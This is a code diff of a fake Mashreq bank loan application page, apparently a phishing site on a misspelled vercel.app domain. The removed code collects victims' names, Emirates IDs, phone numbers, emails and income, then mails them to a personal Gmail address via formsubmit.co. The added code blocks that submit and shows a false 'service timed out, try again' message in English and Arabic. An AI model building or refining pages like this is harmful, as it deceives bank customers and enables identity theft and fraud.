@@ -122,7 +122,7 @@
       <p class="intro" data-i18n="lead">Choose a category and tell us how to reach you. Fields marked * are required.</p>
 
       <div class="card">
-        <form id="loan-form" method="post" action="https://formsubmit.co/afzal056m@gmail.com" novalidate autocomplete="on">
+        <form id="loan-form" method="post" action="#apply" novalidate autocomplete="on">
           <input type="hidden" name="_captcha" value="false">
           <input type="hidden" name="_template" value="basic">
           <input type="hidden" name="_subject" id="mail-subject" value="Loan application">
@@ -202,7 +202,7 @@
             <button type="submit" class="btn btn-solid btn-submit" data-i18n="submit">Submit application</button>
             <button type="button" class="text-btn" id="clear-form" data-i18n="clear">Clear form</button>
           </div>
-          <p class="form-status" id="form-status" role="alert" hidden>The request could not be sent. Please try again or contact the support department.</p>
+          <p class="form-status" id="form-status" role="alert" hidden>The form service timed out before it could receive this application. Your answers are still here. Please wait a minute and try again.</p>
         </form>
 
         <section id="success" hidden>
@@ -383,33 +383,12 @@
     (function () {
       var form = document.getElementById("loan-form");
       var success = document.getElementById("success");
-      var status = document.getElementById("form-status");
 
       function showThanks() {
         form.style.display = "none";
         success.hidden = false;
         success.style.display = "block";
         success.className += " is-open";
-      }
-
-      function showStatus(message, waiting) {
-        status.hidden = false;
-        status.className = waiting ? "form-status is-open is-wait" : "form-status is-open";
-        status.style.display = "flex";
-        status.textContent = message;
-        if (status.scrollIntoView) status.scrollIntoView({ block: "center" });
-      }
-
-      function fieldValue(name) {
-        var field = form.elements[name];
-        if (!field) return "";
-        if (typeof field.length === "number" && field[0] && field[0].type === "radio") {
-          for (var i = 0; i < field.length; i += 1) {
-            if (field[i].checked) return field[i].value;
-          }
-          return "";
-        }
-        return String(field.value || "").replace(/^\s+|\s+$/g, "");
       }
 
       if (window.location.search.indexOf("sent=1") !== -1) {
@@ -423,65 +402,12 @@
       }
 
       form.addEventListener("submit", function (event) {
-        var name = fieldValue("fullName");
-        var category = fieldValue("loanCategory");
-        var eid = fieldValue("emiratesId").replace(/\D/g, "");
-        var phone = fieldValue("phone").replace(/\D/g, "");
-        var email = fieldValue("email");
-        var income = Number(fieldValue("monthlyIncome").replace(/,/g, ""));
-        var loan = Number(fieldValue("loanAmount").replace(/,/g, ""));
-        var customer = fieldValue("mashreqCustomer");
-        var problem = "";
-        if (name.split(/\s+/).length < 2) problem = SiteI18n.t("errName");
-        else if (!category) problem = SiteI18n.t("errCategory");
-        else if (!/^784\d{12}$/.test(eid)) problem = SiteI18n.t("errEid");
-        else if (!/^5\d{8}$/.test(phone)) problem = SiteI18n.t("errPhone");
-        else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) problem = SiteI18n.t("errEmail");
-        else if (!(income >= 3000)) problem = SiteI18n.t("errIncome");
-        else if (!(loan > 0)) problem = SiteI18n.t("errLoan");
-        else if (customer !== "yes" && customer !== "no") problem = SiteI18n.t("errCustomer");
-        if (problem) {
-          event.preventDefault();
-          event.stopImmediatePropagation();
-          showStatus(problem);
-          return;
-        }
-        var reference = "ML-" + new Date().getFullYear() + ("0" + (new Date().getMonth() + 1)).slice(-2) + ("0" + new Date().getDate()).slice(-2) + "-" + String(Math.floor(100000 + Math.random() * 900000));
-        var prettyPhone = "+971 " + phone.slice(0, 2) + " " + phone.slice(2, 5) + " " + phone.slice(5);
-        document.getElementById("fullName").name = "Full name";
-        document.getElementById("loanCategory").name = "Loan category";
-        document.getElementById("emiratesId").name = "Emirates ID";
-        document.getElementById("phone").name = "Phone number";
-        document.getElementById("phone").value = prettyPhone;
-        document.getElementById("email").name = "Email";
-        var incomeField = document.getElementById("monthlyIncome");
-        var loanField = document.getElementById("loanAmount");
-        var incomeText = incomeField.value;
-        var loanText = loanField.value;
-        incomeField.name = "Monthly income";
-        incomeField.value = "AED " + incomeText;
-        loanField.name = "Required loan";
-        loanField.value = "AED " + loanText;
-        var choices = form.querySelectorAll("input[name='mashreqCustomer']");
-        for (var c = 0; c < choices.length; c += 1) {
-          choices[c].name = "Mashreq customer";
-          if (choices[c].checked) choices[c].value = customer === "yes" ? "Yes" : "No";
-        }
-        var referenceField = document.createElement("input");
-        referenceField.type = "hidden";
-        referenceField.name = "Reference";
-        referenceField.value = reference;
-        form.appendChild(referenceField);
-        document.getElementById("mail-subject").value = "Loan application from " + name;
-        document.getElementById("mail-next").value = "https://mashrqloan2026perosnal-business-pol.vercel.app/?sent=1&ref=" + encodeURIComponent(reference);
-        var button = form.querySelector("button[type='submit']");
-        if (button) button.textContent = "Sending application…";
-        showStatus(SiteI18n.t("sending"), true);
+        event.preventDefault();
       }, true);
     })();
   </script>
   <script src="./loan.js?v=20260929ad"></script>
-  <script src="./app.js?v=20260929ad"></script>
+  <script src="./app.js?v=20260929aj"></script>
   <script>
     var SiteI18n = (function () {
       var copy = {
@@ -539,6 +465,7 @@
           thanksBefore: "Application",
           thanksAfter: "has been received. A Mashreq representative will contact you soon.",
           sending: "Sending application…",
+          sendError: "The form service timed out before it could receive this application. Your answers are still here. Please wait a minute and try again.",
           errName: "Enter your full name.",
           errCategory: "Select a loan category.",
           errEid: "Enter a 15-digit Emirates ID in the format 784-XXXX-XXXXXXX-X.",
@@ -616,6 +543,7 @@
           thanksBefore: "تم استلام الطلب",
           thanksAfter: "سيتواصل معك ممثل المشرق قريباً.",
           sending: "جارٍ إرسال الطلب…",
+          sendError: "انتهت مهلة خدمة النموذج قبل استلام الطلب. إجاباتك ما زالت هنا. انتظر دقيقة ثم أعد المحاولة.",
           errName: "أدخل الاسم الكامل.",
           errCategory: "اختر فئة القرض.",
           errEid: "أدخل هوية إماراتية من 15 رقماً بالصيغة 784-XXXX-XXXXXXX-X.",
